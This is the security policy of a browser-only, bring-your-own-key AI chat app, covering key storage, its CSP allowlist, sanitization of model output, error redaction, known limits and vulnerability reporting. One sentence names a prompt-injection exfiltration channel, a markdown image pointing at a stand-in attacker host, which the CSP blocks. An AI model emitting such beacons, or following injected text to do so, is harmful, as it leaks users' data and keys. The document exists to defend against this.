# Security

Yes-Brainer is a **browser-only, bring-your-own-key (BYOK)** app. There is no
backend we operate. This document explains what that means for the safety of
your API keys and conversations, the concrete defenses in the code, the
threats those defenses do and don't cover, and how to report a vulnerability.

## The one-sentence model

Your keys and conversations live in **your browser's storage on your device**,
and they travel exactly one route: **directly from your browser to the model
provider you chose**. Nobody operates a server in the middle — the app is a
static bundle of HTML/JS/CSS. (The official site also sends an anonymous,
cookie-less pageview count to a self-hosted counter — fully described below;
keys and content aren't part of its payload.)

## What's stored, where, and who can see it

| Asset | Location | Reachable by |
|---|---|---|
| API keys | `localStorage` (`yesbrainer:keys`), plaintext, per-device | The provider you point them at, only when you send a turn. Nobody else. |
| Conversations (councils, turns, votes, token totals) | IndexedDB (`yesbrainer` DB) via Dexie | Nobody holds a copy — no sync, no server-side store. Content reaches only the provider you chose, when you send a turn (history rides as context). |
| Settings / prompts / run options | `localStorage` (`yesbrainer:*`) | Nobody. |
| Provider API calls | Direct browser → provider over TLS | The provider you chose. |

Keys are stored in plaintext in `localStorage`. This is the standard,
unavoidable shape for a serverless BYOK app: the key must be readable by the
JavaScript that calls the provider, so any at-rest encryption in the same
origin is decorative (the decryption key would sit right next to it). The real
protection is **origin isolation** (below), not obfuscation. Treat the browser
profile as the trust boundary — on a shared machine, use a separate OS/browser
profile.

## Defenses in the code

**Content-Security-Policy (the main exfiltration defense).** The production
build injects a strict CSP (`vite.config.ts`). The load-bearing directive is
`connect-src`: an **allowlist** of exactly the five supported provider
endpoints plus local Ollama (and, on the official deploy only, the first-party
pageview collector described below). Even if an attacker achieved script execution in
the page, the browser would refuse to let it `fetch()`/`POST` your keys to any
other host. (Ollama itself is opt-in: the app sends **no localhost traffic at
all** unless the user enables the Ollama toggle in Settings → Keys — an
unsolicited page probing `localhost` ports is exactly the behaviour this app
shouldn't exhibit.) Supporting directives: `script-src 'self'` (no inline/remote
scripts), `img-src 'self' data: blob:` (blocks remote-image beacons — the
classic prompt-injection channel where a model emits
`![](https://attacker/?q=…)` and the browser silently GETs it), `object-src
'none'`, `base-uri 'self'`, `frame-src 'none'`. The one deliberate allowance
is `style-src 'unsafe-inline'` — required by React inline styles and Shiki's
token styling; styles can't execute script, and the exfiltration channels CSS
could abuse (`url()` loads) are closed by `img-src`/`font-src`. Adding a
provider means extending the allowlist deliberately — that friction is the
point.

> CSP is delivered as a `<meta>` tag because the app ships to static hosts
> (e.g. GitHub Pages) that can't set response headers. One consequence:
> `frame-ancestors` is ignored in meta form, so clickjacking protection isn't
> enforced by the app — host it somewhere that sends `X-Frame-Options:
> DENY` / a header CSP if that's in your threat model.

**Untrusted content is treated as untrusted.** Two sources are never trusted:
model output and imported backup files.

- *Model output* is rendered through `react-markdown` with `rehype-sanitize`
  (an allowlist sanitizer — unsafe protocols like `javascript:` and dangerous
  elements are stripped) and links open with `rel="noopener noreferrer"` and
  `target="_blank"`. There is no `dangerouslySetInnerHTML` anywhere in the app.
- *Imported bundles* (`storage/transfer.ts`) are validated with a strict
  `zod` schema (`storage/bundle-schema.ts`) down to the leaves before a single
  row is written. Notably, attached-image URIs must be `data:image/…`, so a
  crafted file can't smuggle a foreign-protocol or remote URL into an `<img>`.

**Secret redaction in errors.** Provider SDK errors sometimes serialize the
failing request, including its `Authorization: Bearer …` header. Because a
turn's error is persisted (and included in exports), every error-to-string
path runs through `redactSecrets` (`utils/redact-secrets.ts`), which scrubs
both the exact configured key values and anything key-shaped. A shared export
never carries a key inside an error message. The same rule covers the
**console**: raw provider error objects are never logged (`logRedactedError`
in `utils/extract-error.ts` logs a scrubbed serialization instead), so
"open the console and paste what you see" — the standard bug-report ask —
can't leak a key either.

**No third-party calls; one first-party counter.** No error-reporting, no CDN
calls, no third-party analytics scripts — nothing executes in the page except
this repo's code. The official site reports anonymous pageviews to a
self-hosted collector (`stats.yesbrainer.ai`; the official build posts to its
`/ybs` path — a nonstandard name because ad-blocker lists match the default
one, not concealment: the `stats.` subdomain says plainly what the host does,
and the JSON payload is readable in devtools): the route *pattern* (from a fixed
list — app-defined settings-tab names pass as literals; raw URLs, council
ids, query params, and titles aren't part of the payload), the serving
hostname (so the dashboard can tell the official deploy from localhost or a
rehost), screen size, language, the external referrer on the first pageview,
and feature-usage counts from the closed `AppEventName` list (council
created/deleted, verdict shared, demo opened, key added per provider — the
provider *name*, not the key —, Ollama enabled, PWA installed, export/import,
storage wipes, persistence grant/deny) — action counts, not content. No
cookies, no client-side identifier — visitor counting happens server-side. The reporting code is `src/analytics/`
(small enough to read in one sitting), the payload is a closed type so nothing
else *can* be sent, and the endpoint is injected at build time — a fork that
builds this repo sends nothing. A blocked, offline, or down collector changes
nothing about the app: every failure path is swallowed. Per-browser opt-out:
set localStorage `yesbrainer:analytics-disabled` to `1` (a `yesbrainer:*` key,
so a factory reset clears it too). `referrer` is set to `no-referrer` so the
page URL never leaks to providers or clicked links. Dependencies are audited
(`npm audit` clean at release).

**Factory reset.** Settings → Storage → wipe drops the entire IndexedDB
database and every `yesbrainer:*` localStorage key.

<!-- The Keys settings page deep-links to this heading's anchor
     (SECURITY_THREATS_URL in src/utils/external-links.ts) — if you rename
     the heading, update that constant. -->
## What this does NOT protect against

Being honest about the boundary:

- **A compromised device or browser profile.** Malware, a malicious browser
  extension with host permissions, or physical access to an unlocked profile
  can read `localStorage`. No web app can defend its own origin's storage from
  the browser it runs in.
- **A supply-chain compromise of a dependency.** CSP narrows the blast radius
  (stolen keys can't be POSTed off-origin), but a malicious dependency running
  in-page is a serious event. Mitigation: pinned versions, `npm audit`, and a
  small, reviewed dependency set.
- **A malicious or compromised model provider.** BYOK means you send prompts
  and a key directly to the provider you chose; you're trusting them as you
  would using their own app. OpenRouter additionally proxies your prompt
  through its servers (documented in the model registry).
- **Rogue hosting / lookalike domains.** These guarantees describe the code —
  they reach you only if you load that code from the official deployment,
  **https://yesbrainer.ai**. A copied site (the same app on a similar-looking
  domain) can be modified to steal keys while still linking to this repo as
  "proof", and nothing in the code can defend against that — the address bar
  is the one thing a copy can't fake. Check it before pasting a key. If you
  find a lookalike or modified deployment, report it (below).
- **A key with no limits.** Cap the blast radius before it matters: use a
  dedicated key just for this app and set a spending limit in the provider's
  console. A leaked capped key is a bounded, one-click-revocable event; an
  uncapped account key is not. There's no server here to revoke anything —
  the provider's dashboard is the source of truth.

No warranty is expressed or implied — the software is provided **as-is**
(AGPL-3.0 §§15–16). The honest summary: the code does what it says, you
choose where you run it, and your keys remain your responsibility.

## Reporting a vulnerability

Please report security issues privately rather than opening a public issue.
Use GitHub's **"Report a vulnerability"** (Security → Advisories) on the
repository, or reach the maintainer through the contact options on
[trekhleb.dev](https://trekhleb.dev). Include reproduction steps and the
affected version/commit. As a single-maintainer hobby project there's no 
formal SLA, but security reports are prioritized over features.

The same channels apply to **lookalike domains or modified deployments**
posing as Yes-Brainer — report them like a vulnerability; takedowns get
priority over everything else.
